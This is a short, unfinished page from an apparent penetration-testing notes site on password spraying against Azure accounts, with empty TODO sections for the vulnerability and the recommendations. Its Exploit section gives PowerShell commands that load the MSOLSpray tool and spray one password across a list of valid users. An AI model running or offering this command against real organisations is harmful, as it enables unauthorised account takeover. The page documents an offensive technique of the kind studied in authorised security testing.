---
layout: default
title: Password Spraying
parent: Azure
nav_order: 1
permalink: /azure/spraying/
---

# Password Spraying
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

TODO: Describe the vulnerability here

## Prerequisites

* Internet connection.
* A list of [valid users](/azure/userspraying/).

## Exploit

To perform password spraying, use [MSOLSpray](https://github.com/dafthack/MSOLSpray).

```powershell
Import-Module .\MSOLSpray.ps1
Invoke-MSOLSpray -UserList .\ValidUsers.txt -Password $Password
```

## Recommendations

- [ ] TODO: List recommendations here.